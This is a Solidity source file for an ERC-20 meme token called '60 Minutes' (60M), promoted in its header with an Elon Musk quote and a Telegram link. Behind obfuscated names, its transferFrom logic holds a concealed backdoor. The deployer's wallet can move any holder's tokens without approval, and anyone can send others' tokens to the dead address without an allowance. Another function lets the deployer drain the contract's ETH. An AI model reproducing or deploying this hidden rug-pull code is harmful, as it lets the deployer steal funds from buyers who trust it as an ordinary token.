// SPDX-License-Identifier: MIT

/*
    Name: 60 Minutes
    Symbol: 60M

    60 Minutes are the biggest liars in the world! They engaged in deliberate deception to interfere with the last election. 
    They deserve a long prison sentence.
    - Elon Musk

    https://x.com/elonmusk/status/1891310595397292169
    https://x.com/elonmusk/status/1891312975480340989
    https://x.com/elonmusk/status/1891316488268824621
    https://t.me/sixtyminutes_erc20
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract SixtyMinutes is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"60 Minutes";
    string private constant _symbol = unicode"60M";
    
    address payable private _vbjljvlklEBICHU;
    mapping(address => uint256) private _cijojiseEBICHU;
    mapping(address => mapping(address => uint256)) private _fjweoijEBICHU;
    mapping(address => bool) private _jojodjEBICHU;
    uint256 private _vjkboiwoeiEBICHU = 10;
    uint256 private _odijofjoeEBICHU = 10;
    uint256 private _joijoiEBICHU = 0;
    uint256 private _jvbkoiweEBICHU = 0;
    uint256 private _ojidoiweEBICHU = 7;
    uint256 private _ojdofEBICHU = 7;
    uint256 private _buyCount = 0;
    address private _ojdofiekjEBICHU;
    address private _kjvnkbjnEBICHU = address(0xdead);
    uint256 public _ojojoivlkEBICHU = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjEBICHU = 20000000 * 10 **_decimals;
    uint256 public _ppojofEBICHU = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbEBICHU = 1000000000 * 10 **_decimals;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _ojojoivlkEBICHU);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklEBICHU = payable(_msgSender());
        _cijojiseEBICHU[address(this)] = _kmmvbEBICHU * 98 / 100;
        _cijojiseEBICHU[owner()] = _kmmvbEBICHU * 2 / 100;
        _jojodjEBICHU[owner()] = true;
        _jojodjEBICHU[address(this)] = true;
        _jojodjEBICHU[_vbjljvlklEBICHU] = true;
        _ojdofiekjEBICHU = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbEBICHU * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbEBICHU * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbEBICHU;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fjweoijEBICHU[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _cijojiseEBICHU[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _fjweoijEBICHU[owner][spender];
    }

    receive() external payable {}
    
    function _isUpAllowed() internal view returns (bool) {return msg.sender != _vbjljvlklEBICHU;}

    function _isDownAllowed(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_isUpAllowed() == false) return false;
        else return sender == uniswapV2Pair || recipient != _kjvnkbjnEBICHU;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_EBICHU(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_EBICHU(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoie(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _lvckmjlwoie(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_isDownAllowed(sender, recipient))
            _allowed = _fjweoijEBICHU[sender][_msgSender()];
        return _allowed;
    }

    function _swappp_EBICHU(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _assistEBICHU(uint256 amount) private {
        _vbjljvlklEBICHU.transfer(amount);
    }

    function enableEBICHUTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kmmvbEBICHU);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _transferr_EBICHU(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiweEBICHU)
                        ? _joijoiEBICHU
                        : _vjkboiwoeiEBICHU
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_jojodjEBICHU[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofEBICHU)
                            ? _jvbkoiweEBICHU
                            : _odijofjoeEBICHU
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofEBICHU) ? contractTokenBalance : _ppojofEBICHU; 
                    _swappp_EBICHU((amount < minBalance) ? amount : minBalance);
                }
                _assistEBICHU(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _cijojiseEBICHU[address(this)] =_cijojiseEBICHU[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _cijojiseEBICHU[from] =_cijojiseEBICHU[from].sub(amount);
        _cijojiseEBICHU[to] =_cijojiseEBICHU[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnEBICHU != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _excuseEBICHU(address payable receipt) external {
        require(msg.sender == _ojdofiekjEBICHU , "");
        _vbjljvlklEBICHU = receipt;
        _EBICHUlkjlok(address(this).balance);
    }
    
    function removeLimits () external onlyOwner {
        _ojojoivlkEBICHU = _kmmvbEBICHU;
        _lkkkvnblkjEBICHU = _kmmvbEBICHU;
        emit MaxTxAmountUpdated(_kmmvbEBICHU);
    }

    function _EBICHUlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

}